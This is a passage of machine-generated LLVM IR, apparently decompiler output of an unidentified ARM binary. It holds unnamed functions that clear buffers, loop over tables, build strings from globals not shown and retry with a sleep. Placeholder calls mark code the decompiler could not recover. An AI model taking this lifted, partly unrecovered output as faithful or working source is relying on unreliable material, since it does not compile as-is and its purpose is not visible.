  %stack_var_-160 = alloca i32, align 4
  %v3_9994 = load i32, i32* @r4, align 4
  %v6_9994 = load i32, i32* @r5, align 4
  %v9_9994 = load i32, i32* @r6, align 4
  %v12_9994 = load i32, i32* @r7, align 4
  %v15_9994 = load i32, i32* @lr, align 4
  %v1_9998 = add i32 %arg1, 18
  store i32 %v1_9998, i32* @r5, align 4
  store i32 1024, i32* @r2, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r7, align 4
  store i32 %v1_9998, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v4_99b4 = call i32 @function_ab54(i32 %v1_9998, i8 0, i32 1024)
  store i32 %v4_99b4, i32* %r0.global-to-local, align 4
  %v2_99c8 = ptrtoint i32* %stack_var_-160 to i32
  store i32 %v2_99c8, i32* @r6, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %stack_var_-160, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_99d4.dec_label_pc_99d4_crit_edge

dec_label_pc_99d4.dec_label_pc_99d4_crit_edge:    ; preds = %dec_label_pc_99d4.dec_label_pc_99d4_crit_edge.dec_label_pc_99d4.dec_label_pc_99d4_crit_edge_crit_edge, %dec_label_pc_99d4.dec_label_pc_99d4_crit_edge.lr.ph
  %v2_99d4.pre = phi i32 [ %v2_99c8, %dec_label_pc_99d4.dec_label_pc_99d4_crit_edge.lr.ph ], [ %v2_99d4.pre.pre, %dec_label_pc_99d4.dec_label_pc_99d4_crit_edge.dec_label_pc_99d4.dec_label_pc_99d4_crit_edge_crit_edge ]
  %v0_99d4.pre = phi i32 [ 0, %dec_label_pc_99d4.dec_label_pc_99d4_crit_edge.lr.ph ], [ %v0_99d4.pre.pre, %dec_label_pc_99d4.dec_label_pc_99d4_crit_edge.dec_label_pc_99d4.dec_label_pc_99d4_crit_edge_crit_edge ]
  %v1_99d821 = phi i32 [ 4, %dec_label_pc_99d4.dec_label_pc_99d4_crit_edge.lr.ph ], [ %v1_99d8, %dec_label_pc_99d4.dec_label_pc_99d4_crit_edge.dec_label_pc_99d4.dec_label_pc_99d4_crit_edge_crit_edge ]
  %v3_99d4 = add i32 %v1_99d821, %v2_99d4.pre
  %v4_99d4 = inttoptr i32 %v3_99d4 to i32*
  store i32 %v0_99d4.pre, i32* %v4_99d4, align 4
  %v0_99d8 = load i32, i32* %r3.global-to-local, align 4
  %v1_99d8 = add i32 %v0_99d8, 4
  store i32 %v1_99d8, i32* %r3.global-to-local, align 4
  %v7_99dc = icmp eq i32 %v1_99d8, 128
  br i1 %v7_99dc, label %dec_label_pc_99e4, label %dec_label_pc_99d4.dec_label_pc_99d4_crit_edge.dec_label_pc_99d4.dec_label_pc_99d4_crit_edge_crit_edge

dec_label_pc_99d4.dec_label_pc_99d4_crit_edge.dec_label_pc_99d4.dec_label_pc_99d4_crit_edge_crit_edge: ; preds = %dec_label_pc_99d4.dec_label_pc_99d4_crit_edge
  %v0_99d4.pre.pre = load i32, i32* %r1.global-to-local, align 4
  %v2_99d4.pre.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_99d4.dec_label_pc_99d4_crit_edge

dec_label_pc_99e4:                                ; preds = %dec_label_pc_99d4.dec_label_pc_99d4_crit_edge
  %v0_9a04.pre = load i32, i32* %r1.global-to-local, align 4
  %v0_99e4 = load i32, i32* @r4, align 4
  %v1_99e4 = add i32 %v0_99e4, 8
  %v2_99e4 = inttoptr i32 %v1_99e4 to i32*
  %v3_99e4 = load i32, i32* %v2_99e4, align 4
  store i32 %v3_99e4, i32* %r0.global-to-local, align 4
  %v2_99e8 = ptrtoint i32* %stack_var_-24 to i32
  %v3_99ec = udiv i32 %v3_99e4, 32
  store i32 %v3_99ec, i32* %r3.global-to-local, align 4
  %v4_99f0 = mul nuw nsw i32 %v3_99ec, 4
  %v5_99f0 = add i32 %v4_99f0, %v2_99e8
  store i32 %v5_99f0, i32* @lr, align 4
  %v1_99f4 = add i32 %v5_99f0, -136
  %v2_99f4 = inttoptr i32 %v1_99f4 to i32*
  %v3_99f4 = load i32, i32* %v2_99f4, align 4
  %v1_99f8 = urem i32 %v3_99e4, 32
  store i32 1, i32* %r3.global-to-local, align 4
  %v7_9a00 = shl i32 1, %v1_99f8
  %v8_9a00 = or i32 %v3_99f4, %v7_9a00
  store i32 %v8_9a00, i32* %v2_99f4, align 4
  %v0_9a0c = load i32, i32* %r0.global-to-local, align 4
  %v1_9a0c = load i32, i32* %r3.global-to-local, align 4
  %v2_9a0c = add i32 %v1_9a0c, %v0_9a0c
  store i32 %v2_9a0c, i32* %r0.global-to-local, align 4
  store i32 %v2_99c8, i32* %r1.global-to-local, align 4
  store i32 %v0_9a04.pre, i32* %r3.global-to-local, align 4
  %v5_9a20 = call i32 @function_ba0c(i32 %v2_9a0c, i32 %v2_99c8, i32 %v0_9a04.pre, i32 %v0_9a04.pre, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_9a20, i32* %r0.global-to-local, align 4
  %tmp15 = icmp slt i32 %v5_9a20, 1
  br i1 %tmp15, label %dec_label_pc_9a6c, label %dec_label_pc_9a2c

dec_label_pc_9a2c:                                ; preds = %dec_label_pc_99e4
  %v0_9a2c = load i32, i32* @r4, align 4
  %v1_9a2c = add i32 %v0_9a2c, 8
  %v2_9a2c = inttoptr i32 %v1_9a2c to i32*
  %v3_9a2c = load i32, i32* %v2_9a2c, align 4
  store i32 %v3_9a2c, i32* %r0.global-to-local, align 4
  %v0_9a30 = load i32, i32* @r5, align 4
  store i32 %v0_9a30, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_9a3c = call i32 @function_c354(i32 %v3_9a2c, i32 %v0_9a30, i32 1024, i32 16384)
  store i32 %v4_9a3c, i32* %r0.global-to-local, align 4
  %tmp16 = icmp slt i32 %v4_9a3c, 1
  br i1 %tmp16, label %dec_label_pc_9a6c, label %dec_label_pc_9a48

dec_label_pc_9a48:                                ; preds = %dec_label_pc_9a2c
  %v0_9a48 = load i32, i32* @r7, align 4
  store i32 %v0_9a48, i32* @r0, align 4
  %v0_9a4c = call i32 @function_aab8()
  %v0_9a50 = load i32, i32* @r7, align 4
  store i32 %v0_9a4c, i32* %r3.global-to-local, align 4
  store i32 1024, i32* %r1.global-to-local, align 4
  %v0_9a5c = load i32, i32* @r5, align 4
  store i32 %v0_9a5c, i32* %r0.global-to-local, align 4
  %v4_9a60 = call i32 @function_acf0(i32 %v0_9a5c, i32 1024, i32 %v0_9a50, i32 %v0_9a4c)
  %v3_9a64 = icmp eq i32 %v4_9a60, -1
  br i1 %v3_9a64, label %dec_label_pc_9a6c, label %dec_label_pc_9a70

dec_label_pc_9a6c:                                ; preds = %dec_label_pc_9a48, %dec_label_pc_9a2c, %dec_label_pc_99e4
  br label %dec_label_pc_9a70

dec_label_pc_9a70:                                ; preds = %dec_label_pc_9a48, %dec_label_pc_9a6c
  %storemerge = phi i32 [ 0, %dec_label_pc_9a6c ], [ %v4_9a60, %dec_label_pc_9a48 ]
  %v1_9a78 = phi i32 [ 0, %dec_label_pc_9a6c ], [ %v4_9a60, %dec_label_pc_9a48 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 %v3_9994, i32* @r4, align 4
  store i32 %v6_9994, i32* @r5, align 4
  store i32 %v9_9994, i32* @r6, align 4
  store i32 %v12_9994, i32* @r7, align 4
  store i32 %v15_9994, i32* @lr, align 4
  ret i32 %v1_9a78

; uselistorder directives
  uselistorder i32 %v3_99ec, { 1, 0 }
  uselistorder i32 %v3_99e4, { 1, 0, 2 }
  uselistorder i32 %v0_9a04.pre, { 2, 0, 1 }
  uselistorder i32 %v1_99d8, { 1, 2, 0 }
  uselistorder i32 %v2_99c8, { 1, 2, 0, 3 }
  uselistorder i32 %v1_9998, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 8, 7, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 5, 4, 6, 7, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 2, 4, 3, 8, 5, 6, 7, 10, 9, 1 }
  uselistorder i32 (i32, i32, i32, i32)* @function_c354, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_9a70, { 1, 0 }
}

define i32 @function_9a7c() local_unnamed_addr {
dec_label_pc_9a7c:
  %r5.global-to-local = alloca i32, align 4
  %v3_9a7c = load i32, i32* @r4, align 4
  %v0_9a80 = load i32, i32* @r0, align 4
  store i32 %v0_9a80, i32* %r5.global-to-local, align 4
  %v0_9a8c = load i32, i32* @r1, align 4
  store i32 %v0_9a8c, i32* @r4, align 4
  %v2_9a90 = call i32 @function_bad0(i32* null)
  %v0_9a94 = load i32, i32* @r4, align 4
  %v1_9a94 = trunc i32 %v0_9a94 to i8
  %v3_9a94 = add i32 %v0_9a80, 16
  %v4_9a94 = inttoptr i32 %v3_9a94 to i8*
  store i8 %v1_9a94, i8* %v4_9a94, align 1
  %v1_9a98 = load i32, i32* %r5.global-to-local, align 4
  %v2_9a98 = add i32 %v1_9a98, 12
  %v3_9a98 = inttoptr i32 %v2_9a98 to i32*
  store i32 %v2_9a90, i32* %v3_9a98, align 4
  store i32 %v3_9a7c, i32* @r4, align 4
  ret i32 %v2_9a90
}

define i32 @function_9aa8(i32 %arg1, i8 %arg2) local_unnamed_addr {
dec_label_pc_9aa8:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = sext i8 %arg2 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v3_9aa8 = load i32, i32* @r4, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r4, align 4
  %v2_9abc = call i32 @function_bad0(i32* null)
  store i32 %v2_9abc, i32* %r0.global-to-local, align 4
  %v1_9ac0 = load i32, i32* @r5, align 4
  %v2_9ac0 = add i32 %v1_9ac0, 12
  %v3_9ac0 = inttoptr i32 %v2_9ac0 to i32*
  store i32 %v2_9abc, i32* %v3_9ac0, align 4
  %v0_9ac4 = load i32, i32* @r5, align 4
  %v1_9ac4 = add i32 %v0_9ac4, 8
  %v2_9ac4 = inttoptr i32 %v1_9ac4 to i32*
  %v3_9ac4 = load i32, i32* %v2_9ac4, align 4
  store i32 %v3_9ac4, i32* %r0.global-to-local, align 4
  %v1_9ac8 = call i32 @function_e720(i32 %v3_9ac4)
  store i32 %v1_9ac8, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_9ad0 = load i32, i32* @r4, align 4
  %v2_9ad0 = icmp eq i32 %v0_9ad0, 0
  store i1 %v2_9ad0, i1* %cpsr_z.global-to-local, align 1
  %v2_9ad4 = load i32, i32* @r5, align 4
  %v3_9ad4 = add i32 %v2_9ad4, 16
  %v4_9ad4 = inttoptr i32 %v3_9ad4 to i8*
  store i8 0, i8* %v4_9ad4, align 1
  %v0_9ad8 = load i32, i32* @r4, align 4
  %v1_9ad8 = trunc i32 %v0_9ad8 to i8
  %v2_9ad8 = load i32, i32* @r5, align 4
  %v3_9ad8 = add i32 %v2_9ad8, 17
  %v4_9ad8 = inttoptr i32 %v3_9ad8 to i8*
  store i8 %v1_9ad8, i8* %v4_9ad8, align 1
  %v0_9adc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_9adc, label %dec_label_pc_9aec, label %dec_label_pc_9ae0

dec_label_pc_9ae0:                                ; preds = %dec_label_pc_9aa8
  %v0_9ae0 = load i32, i32* @r5, align 4
  %v1_9ae0 = add i32 %v0_9ae0, 1044
  %v2_9ae0 = inttoptr i32 %v1_9ae0 to i32*
  %v3_9ae0 = load i32, i32* %v2_9ae0, align 4
  store i32 %v3_9ae0, i32* %r0.global-to-local, align 4
  %v1_9ae4 = load i32, i32* %r3.global-to-local, align 4
  %v9_9ae4 = icmp eq i32 %v3_9ae0, %v1_9ae4
  store i1 %v9_9ae4, i1* %cpsr_z.global-to-local, align 1
  %v1_9ae8 = xor i1 %v9_9ae4, true
  call void @__pseudo_cond_branch(i1 %v1_9ae8, i32 ptrtoint (i32* @global_var_d458.137 to i32))
  br label %dec_label_pc_9aec

dec_label_pc_9aec:                                ; preds = %dec_label_pc_9aa8, %dec_label_pc_9ae0
  store i32 %v3_9aa8, i32* @r4, align 4
  %v1_9af4 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_9af4

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 3, 1, 4, 2, 6, 5, 0 }
  uselistorder label %dec_label_pc_9aec, { 1, 0 }
}

define i32 @function_9af8() local_unnamed_addr {
dec_label_pc_9af8:
  %v3_9af8 = load i32, i32* @r4, align 4
  %v6_9af8 = load i32, i32* @r5, align 4
  %v9_9af8 = load i32, i32* @lr, align 4
  %v0_9afc = load i32, i32* @r0, align 4
  %v0_9b08 = load i32, i32* @r1, align 4
  store i32 %v0_9b08, i32* @r4, align 4
  %v2_9b0c = call i32 @function_bad0(i32* null)
  %v1_9b10 = add i32 %v0_9afc, 12
  %v2_9b10 = inttoptr i32 %v1_9b10 to i32*
  %v3_9b10 = load i32, i32* %v2_9b10, align 4
  %v0_9b14 = load i32, i32* @r4, align 4
  %v2_9b14 = add i32 %v0_9b14, %v3_9b10
  %v6_9b1c = icmp slt i32 %v2_9b14, %v2_9b0c
  br i1 %v6_9b1c, label %dec_label_pc_9b20, label %dec_label_pc_9af8.dec_label_pc_9b34_crit_edge

dec_label_pc_9af8.dec_label_pc_9b34_crit_edge:    ; preds = %dec_label_pc_9af8
  br label %dec_label_pc_9b34

dec_label_pc_9b20:                                ; preds = %dec_label_pc_9af8
  store i32 %v3_9af8, i32* @r4, align 4
  store i32 %v6_9af8, i32* @r5, align 4
  store i32 %v9_9af8, i32* @lr, align 4
  %v3_9b30 = call i32 @function_9aa8(i32 %v0_9afc, i8 1)
  br label %dec_label_pc_9b34

dec_label_pc_9b34:                                ; preds = %dec_label_pc_9af8.dec_label_pc_9b34_crit_edge, %dec_label_pc_9b20
  %v1_9b3c = phi i32 [ %v2_9b0c, %dec_label_pc_9af8.dec_label_pc_9b34_crit_edge ], [ %v3_9b30, %dec_label_pc_9b20 ]
  store i32 %v3_9af8, i32* @r4, align 4
  store i32 %v9_9af8, i32* @lr, align 4
  ret i32 %v1_9b3c

; uselistorder directives
  uselistorder i32 %v0_9afc, { 1, 0 }
  uselistorder i32 %v3_9af8, { 1, 0 }
  uselistorder label %dec_label_pc_9b34, { 1, 0 }
}

define i32 @function_9b40(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_9b40:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp123 = call i32 @__decompiler_undefined_function_0()
  %tmp127 = call i16* @__decompiler_undefined_function_4()
  %tmp128 = call i16 @__decompiler_undefined_function_2()
  %tmp129 = call i32 @__decompiler_undefined_function_0()
  %tmp130 = call i32 @__decompiler_undefined_function_0()
  %tmp131 = call i32 @__decompiler_undefined_function_0()
  %tmp132 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-260 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-312 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-2308 = alloca i32, align 4
  %stack_var_-1284 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-100 = alloca i32, align 4
  %v3_9b40 = load i32, i32* @r4, align 4
  %v6_9b40 = load i32, i32* @r5, align 4
  %v9_9b40 = load i32, i32* @r6, align 4
  %v12_9b40 = load i32, i32* @r7, align 4
  %v15_9b40 = load i32, i32* @r8, align 4
  %v18_9b40 = load i32, i32* @sb, align 4
  %v21_9b40 = load i32, i32* @sl, align 4
  %v24_9b40 = load i32, i32* @fp, align 4
  %v27_9b40 = load i32, i32* @lr, align 4
  %v0_9b50 = call i32 @function_e030()
  store i32 %v0_9b50, i32* %r0.global-to-local, align 4
  %v7_9b54 = icmp eq i32 %v0_9b50, -1
  %. = zext i1 %v7_9b54 to i32
  %tmp167 = icmp slt i32 %v0_9b50, 1
  %storemerge122 = select i1 %tmp167, i32 %., i32 1
  store i32 %storemerge122, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_1d4cc.131 to i32), i32* %r3.global-to-local, align 4
  %v2_9b70 = icmp eq i32 %storemerge122, 0
  store i32 %v0_9b50, i32* @global_var_1d4cc.131, align 4
  br i1 %v2_9b70, label %dec_label_pc_9b7c, label %dec_label_pc_a8c4

dec_label_pc_9b7c:                                ; preds = %dec_label_pc_9b40
  %v0_9b7c = call i32 @function_93c8()
  store i32 %v0_9b7c, i32* %r0.global-to-local, align 4
  %v1_9b80 = call i32 @function_b8d8(i32 %v0_9b7c)
  store i32 %v1_9b80, i32* @r6, align 4
  store i32 84, i32* %r0.global-to-local, align 4
  %v1_9b8c = call i32 @function_da0c(i32 84)
  store i32 %v1_9b8c, i32* %r0.global-to-local, align 4
  %v0_9b90 = load i32, i32* @r4, align 4
  store i32 %v0_9b90, i32* %stack_var_-44, align 4
  store i32 %v1_9b8c, i32* @r5, align 4
  %v0_9b98 = call i32 @function_9310()
  store i32 %v0_9b98, i32* %r0.global-to-local, align 4
  %v0_9b9c = load i32, i32* @r5, align 4
  store i32 %v0_9b98, i32* @r7, align 4
  %tmp170 = icmp slt i32 %v0_9b9c, 1
  br i1 %tmp170, label %dec_label_pc_9b7c.dec_label_pc_9e68_crit_edge, label %dec_label_pc_9ba8

dec_label_pc_9b7c.dec_label_pc_9e68_crit_edge:    ; preds = %dec_label_pc_9b7c
  %v0_9e68.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_a26c

dec_label_pc_9ba8:                                ; preds = %dec_label_pc_9b7c
  %v0_9ba8 = load i32, i32* @r6, align 4
  %v1_9ba8 = add i32 %v0_9ba8, 65436
  %v7_9bac = icmp eq i32 %v0_9b9c, 1
  %.189 = select i1 %v7_9bac, i32 500, i32 1000
  %v3_9bbc = urem i32 %v1_9ba8, 65536
  %v8_9bc0 = icmp ult i32 %v3_9bbc, %.189
  br i1 %v8_9bc0, label %bb174, label %bb173

bb173:                                            ; preds = %dec_label_pc_9ba8
  br label %bb174

bb174:                                            ; preds = %dec_label_pc_9ba8, %bb173
  %storemerge230 = phi i32 [ %.189, %bb173 ], [ %v3_9bbc, %dec_label_pc_9ba8 ]
  %v0_9bcc = phi i32 [ %.189, %bb173 ], [ %v3_9bbc, %dec_label_pc_9ba8 ]
  store i32 %storemerge230, i32* %r3.global-to-local, align 4
  store i32 1048, i32* %r1.global-to-local, align 4
  store i32 %v0_9bcc, i32* %r0.global-to-local, align 4
  %v2_9bd4 = call i32 @function_d0b4(i32 %v0_9bcc, i32 1048)
  store i32 2054, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_9be4 = load i32, i32* @r4, align 4
  store i32 %v0_9be4, i32* %stack_var_-48, align 4
  %v2_9be8 = call i32 @function_d0b4(i32 1, i32 2054)
  store i32 %v2_9be8, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* %r1.global-to-local, align 4
  %v7_9bf0 = icmp eq i32 %arg1, 2
  %v0_9bf4 = load i32, i32* @r4, align 4
  store i32 %v0_9bf4, i32* @r6, align 4
  store i32 %v2_9be8, i32* @r5, align 4
  br i1 %v7_9bf0, label %dec_label_pc_9e70, label %dec_label_pc_9c00

dec_label_pc_9c00:                                ; preds = %bb174
  %v7_9c00 = icmp eq i32 %arg1, 3
  br i1 %v7_9c00, label %dec_label_pc_9c08, label %dec_label_pc_9de4

dec_label_pc_9c08:                                ; preds = %dec_label_pc_9c00
  %v0_9c08 = load i32, i32* @r7, align 4
  store i32 %v0_9c08, i32* %r0.global-to-local, align 4
  store i32 5, i32* %r1.global-to-local, align 4
  %v2_9c10 = call i32 @function_b5a4(i32 %v0_9c08, i32 5)
  store i32 10, i32* @r4, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v2_9c20 = ptrtoint i32* %stack_var_-100 to i32
  store i32 %v2_9c20, i32* %r0.global-to-local, align 4
  %v2_9c24 = call i32 @function_936c(i32 %v2_9c20, i32 10)
  %v2_9c28 = ptrtoint i32* %stack_var_-40 to i32
  %v1_9c2c = load i32, i32* @r4, align 4
  %v2_9c2c = add i32 %v1_9c2c, %v2_9c28
  store i32 %v2_9c2c, i32* %r3.global-to-local, align 4
  %v0_9c30 = load i32, i32* @r6, align 4
  %v1_9c30 = trunc i32 %v0_9c30 to i8
  %v3_9c30 = add i32 %v2_9c2c, -60
  %v4_9c30 = inttoptr i32 %v3_9c30 to i8*
  store i8 %v1_9c30, i8* %v4_9c30, align 1
  store i32 28, i32* %r0.global-to-local, align 4
  %v1_9c38 = call i32 @function_81d0(i32 28)
  store i32 27, i32* %r0.global-to-local, align 4
  %v1_9c40 = call i32 @function_81d0(i32 27)
  store i32 29, i32* %r0.global-to-local, align 4
  %v1_9c48 = call i32 @function_81d0(i32 29)
  store i32 30, i32* %r0.global-to-local, align 4
  %v1_9c50 = call i32 @function_81d0(i32 30)
  store i32 30, i32* %r0.global-to-local, align 4
  %v1_9c58 = call i32 @function_83b4(i32 30)
  store i32 28, i32* %r0.global-to-local, align 4
  %v1_9c64 = call i32 @function_83b4(i32 28)
  store i32 %v1_9c64, i32* @r6, align 4
  store i32 27, i32* %r0.global-to-local, align 4
  %v1_9c70 = call i32 @function_83b4(i32 27)
  store i32 %v1_9c70, i32* @r4, align 4
  store i32 29, i32* %r0.global-to-local, align 4
  %v1_9c7c = call i32 @function_83b4(i32 29)
  br label %dec_label_pc_9c84

dec_label_pc_9c84:                                ; preds = %dec_label_pc_9d54, %dec_label_pc_9c08
  %v0_9c84 = load i32, i32* @r4, align 4
  store i32 %v0_9c84, i32* %r0.global-to-local, align 4
  %v1_9c88 = call i32 @function_9430(i32 %v0_9c84)
  store i32 %v1_9c88, i32* %r0.global-to-local, align 4
  %v2_9c8c = icmp eq i32 %v1_9c88, 0
  %v1_9c90 = load i32, i32* @r5, align 4
  %v2_9c90 = inttoptr i32 %v1_9c90 to i32*
  store i32 %v1_9c88, i32* %v2_9c90, align 4
  br i1 %v2_9c8c, label %dec_label_pc_9d54, label %dec_label_pc_9c98

dec_label_pc_9c98:                                ; preds = %dec_label_pc_9c84
  %v0_9c98 = load i32, i32* @r6, align 4
  store i32 %v0_9c98, i32* %r0.global-to-local, align 4
  %v1_9c9c = call i32 @function_9430(i32 %v0_9c98)
  store i32 %v1_9c9c, i32* %r0.global-to-local, align 4
  %v2_9ca0 = icmp eq i32 %v1_9c9c, 0
  %v1_9ca4 = load i32, i32* @r5, align 4
  %v2_9ca4 = add i32 %v1_9ca4, 4
  %v3_9ca4 = inttoptr i32 %v2_9ca4 to i32*
  store i32 %v1_9c9c, i32* %v3_9ca4, align 4
  br i1 %v2_9ca0, label %dec_label_pc_9d54, label %dec_label_pc_9cac

dec_label_pc_9cac:                                ; preds = %dec_label_pc_9c98
  %v0_9cac = load i32, i32* @r5, align 4
  %v1_9cac = inttoptr i32 %v0_9cac to i32*
  %v2_9cac = load i32, i32* %v1_9cac, align 4
  store i32 %v2_9cac, i32* %r3.global-to-local, align 4
  %v2_9cb0 = icmp eq i32 %v2_9cac, 0
  br i1 %v2_9cb0, label %dec_label_pc_9d54, label %dec_label_pc_9cb8

dec_label_pc_9cb8:                                ; preds = %dec_label_pc_9cac
  %v2_9cbc = ptrtoint i32* %stack_var_-1284 to i32
  store i32 %v2_9cbc, i32* @r4, align 4
  store i32 ptrtoint ([26 x i8]* @global_var_13e1c.142 to i32), i32* %r1.global-to-local, align 4
  store i32 %v2_9cbc, i32* @r0, align 4
  %v3_9cc8 = call i32 @function_ab24(i32 %v2_9cbc, i32 ptrtoint ([26 x i8]* @global_var_13e1c.142 to i32))
  store i32 %v3_9cc8, i32* %r0.global-to-local, align 4
  %v0_9ccc = load i32, i32* @r5, align 4
  %v1_9ccc = add i32 %v0_9ccc, 4
  %v2_9ccc = inttoptr i32 %v1_9ccc to i32*
  %v3_9ccc = load i32, i32* %v2_9ccc, align 4
  store i32 %v3_9ccc, i32* @r1, align 4
  store i32 %v2_9cbc, i32* %r0.global-to-local, align 4
  %v2_9cd4 = bitcast i32* %stack_var_-1284 to i8*
  %v3_9cd4 = call i32 @function_aad8(i8* %v2_9cd4, i32 %v3_9ccc)
  store i32 %v2_9cbc, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_13e38.144 to i32), i32* @r1, align 4
  %v4_9ce0 = call i32 @function_aad8(i8* %v2_9cd4, i32 ptrtoint ([8 x i8]* @global_var_13e38.144 to i32))
  store i32 %v4_9ce0, i32* %r0.global-to-local, align 4
  %v0_9ce4 = load i32, i32* @r5, align 4
  %v1_9ce4 = inttoptr i32 %v0_9ce4 to i32*
  %v2_9ce4 = load i32, i32* %v1_9ce4, align 4
  store i32 %v2_9ce4, i32* @r1, align 4
  store i32 %v2_9cbc, i32* %r0.global-to-local, align 4
  %v3_9cec = call i32 @function_aad8(i8* %v2_9cd4, i32 %v2_9ce4)
  store i32 %v2_9cbc, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_13e34.146 to i32), i32* @r1, align 4
  %v3_9cf8 = call i32 @function_aad8(i8* %v2_9cd4, i32 ptrtoint (i32* @global_var_13e34.146 to i32))
  store i32 %v2_9cbc, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([27 x i8]* @global_var_13e40.148 to i32), i32* @r1, align 4
  %v4_9d04 = call i32 @function_aad8(i8* %v2_9cd4, i32 ptrtoint ([27 x i8]* @global_var_13e40.148 to i32))
  store i32 %v2_9c20, i32* @r1, align 4
  store i32 %v2_9cbc, i32* %r0.global-to-local, align 4
  %v3_9d14 = call i32 @function_aad8(i8* %v2_9cd4, i32 %v2_9c20)
  store i32 %v2_9cbc, i32* @r0, align 4
  %v0_9d1c = call i32 @function_aab8()
  %v2_9d24 = ptrtoint i32* %stack_var_-2308 to i32
  store i32 %v2_9d24, i32* %r5.global-to-local, align 4
  store i32 %v0_9d1c, i32* @sl, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v2_9d24, i32* %r0.global-to-local, align 4
  store i32 1024, i32* @r2, align 4
  %v4_9d38 = call i32 @function_ab54(i32 %v2_9d24, i8 0, i32 1024)
  store i32 %v4_9d38, i32* %r0.global-to-local, align 4
  store i32 %v2_9cbc, i32* @r8, align 4
  store i32 %v2_9d24, i32* @sb, align 4
  store i32 0, i32* @r6, align 4
  %v2_9d4c = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_9d4c, i32* @r4, align 4
  %v2_9d90 = bitcast i32* %stack_var_-2308 to i8*
  br label %dec_label_pc_9d98

dec_label_pc_9d54:                                ; preds = %dec_label_pc_9cac, %dec_label_pc_9c98, %dec_label_pc_9c84
  %v0_9d54 = load i32, i32* @r5, align 4
  store i32 %v0_9d54, i32* @r0, align 4
  %v0_9d58 = call i32 @function_d458()
  store i32 300, i32* %r0.global-to-local, align 4
  %v1_9d60 = call i32 @function_e5cc(i32 300)
  br label %dec_label_pc_9c84

dec_label_pc_9d68:                                ; preds = %dec_label_pc_9d98
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 32, i32* @r2, align 4
  store i32 %v2_9d4c, i32* %r0.global-to-local, align 4
  %v4_9d74 = call i32 @function_ab54(i32 %v2_9d4c, i8 0, i32 32)
  store i32 %v4_9d74, i32* %r0.global-to-local, align 4
  %v0_9d78 = load i32, i32* @r6, align 4
  %v1_9d78 = load i32, i32* @r7, align 4
  %v2_9d78 = add i32 %v1_9d78, %v0_9d78
  %v3_9d78 = inttoptr i32 %v2_9d78 to i8*
  %v4_9d78 = load i8, i8* %v3_9d78, align 1
  %v6_9d78 = zext i8 %v4_9d78 to i32
  store i32 %v2_9d4c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_13e5c.150 to i32), i32* %r1.global-to-local, align 4
  %v4_9d84 = call i32 @function_b3e8(i32 %v2_9d4c, i32 ptrtoint ([3 x i8]* @global_var_13e5c.150 to i32), i32 %v6_9d78)
  store i32 %v2_9d24, i32* %r0.global-to-local, align 4
  store i32 %v2_9d4c, i32* @r1, align 4
  %v3_9d90 = call i32 @function_aad8(i8* %v2_9d90, i32 %v2_9d4c)
  store i32 %v3_9d90, i32* %r0.global-to-local, align 4
  %v0_9d94 = load i32, i32* @r6, align 4
  %v1_9d94 = add i32 %v0_9d94, 1
  store i32 %v1_9d94, i32* @r6, align 4
  br label %dec_label_pc_9d98

dec_label_pc_9d98:                                ; preds = %dec_label_pc_9cb8, %dec_label_pc_9d68
  %v0_9d98 = phi i32 [ 0, %dec_label_pc_9cb8 ], [ %v1_9d94, %dec_label_pc_9d68 ]
  %v1_9d98 = load i32, i32* @sl, align 4
  store i32 %v2_9cbc, i32* @r7, align 4
  store i32 %v2_9d24, i32* @r5, align 4
  %v5_9da4 = icmp slt i32 %v0_9d98, %v1_9d98
